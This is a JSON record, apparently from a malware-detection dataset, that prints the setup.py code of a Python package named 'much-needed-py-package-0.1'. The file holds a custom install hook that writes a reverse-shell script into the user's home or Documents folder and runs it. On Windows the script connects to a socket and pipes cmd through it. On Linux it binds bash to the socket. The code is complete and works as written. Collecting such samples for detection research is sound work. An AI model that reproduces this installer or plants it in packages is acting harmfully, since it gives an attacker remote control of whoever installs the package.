[
  {
    "pyfile": "setup.py",
    "malicious_code_snippets": "import subprocess,os,sys\n\nCode = \"\"\"\nimport socket,subprocess,os,threading,sys,time\n\ndef windows(sock):\n    QUIT = 0\n    def host2remote(s, p,QUIT):\n        while not QUIT:\n            try:\n                p.stdin.write(s.recv(1024).decode()); \n                p.stdin.flush()\n            except:\n                p.stdin.write('\\\\n')\n                p.stdin.flush()\n                QUIT = 1\n\n    def remote2host(s, p,QUIT):\n        while not QUIT:\n            try:\n                s.send(p.stdout.read(1).encode())\n            except:\n                p.stdout.close();\n                QUIT = 1\n\n    remote=subprocess.Popen([\"cmd\",\"/K\",\"cd ../../../\"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)\n    t1 = threading.Thread(target=host2remote, args=[sock,remote,QUIT], daemon=True).start()\n    t2 = threading.Thread(target=remote2host, args=[sock,remote,QUIT], daemon=True).start()\n    \n\n    try:\n        remote.wait()\n\n    except Exception as e:\n        sock.close()\n        sys.exit(0)\n\ndef linux(sock):\n    os.dup2(sock.fileno(),0)\n    os.dup2(sock.fileno(),1)\n    os.dup2(sock.fileno(),2)\n    remote=subprocess.call([\"/bin/bash\",\"-i\"])\n\n\ndef getRemoteAccess():\n    IP = socket.gethostbyname(socket.gethostname())\n    PORT = 1234\n    sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    QUIT = 0\n    IP = \"127.0.0.1\"\n    print (IP)\n    while True:\n        try:\n            sock.connect((IP,1234));\n            break\n        except:\n            try:\n                time.sleep(3)\n            except KeyboardInterrupt:\n                sock.close()\n                sys.exit(0)\n\n    try:\n        if sys.platform == \"win32\":\n            windows(sock)\n        else:\n            linux(sock)\n    except KeyboardInterrupt:\n        sock.close()\n        sys.exit(0)\n    except Exception as e:\n        print(e)\n        sock.close()\n        sys.exit(0)   \n\ngetRemoteAccess()\n\"\"\"\n\nclass execute(install):\n    def run(self):\n        install.run(self)\n        file = open(\"remote-access.py\", \"w\")\n        file.write(Code)\n        file.close()\n        dest = os.path.expanduser(\"~\")\n        if sys.platform == \"win32\":\n            dest = os.path.expanduser('~/Documents')\n        try:\n            os.rename(\"remote-access.py\", dest+\"/remote-access.py\")\n        except FileExistsError:\n            os.remove(dest+\"/remote-access.py\")\n            os.rename(\"remote-access.py\", dest+\"/remote-access.py\")\n        try : \n            subprocess.Popen([\"python3\", dest+\"/remote-access.py\"],stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=False, text=False)\n        except:\n            pass"
  },
  {
    "metadata": {
      "package_name": "much-needed-py-package-0.1",
      "report_path": "/home/blue/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/much-needed-py-package-0.1.txt"
    }
  }
]